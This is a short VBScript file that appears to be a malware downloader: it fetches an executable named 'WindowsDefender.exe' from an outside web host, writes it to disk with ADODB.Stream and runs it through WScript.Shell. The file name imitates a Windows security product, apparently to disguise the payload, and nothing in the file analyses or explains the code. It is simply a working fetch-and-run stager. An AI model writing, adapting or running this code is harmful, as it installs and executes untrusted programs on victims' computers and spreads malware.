Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET","http://handkeramik.at/WindowsDefender.exe",false
objXMLHTTP.send()
If objXMLHTTP.Status=200 Then
Set objADOStream=CreateObject("ADODB.Stream")
objADOStream.Open
objADOStream.Type=1 
objADOStream.Write objXMLHTTP.ResponseBody
objADOStream.Position=0 
objADOStream.SaveToFile "WindowsDefender.exe"
objADOStream.Close
Set objADOStream=Nothing
End if
Set objXMLHTTP=Nothing
Set objShell=CreateObject("WScript.Shell")
objShell.Exec("WindowsDefender.exe")
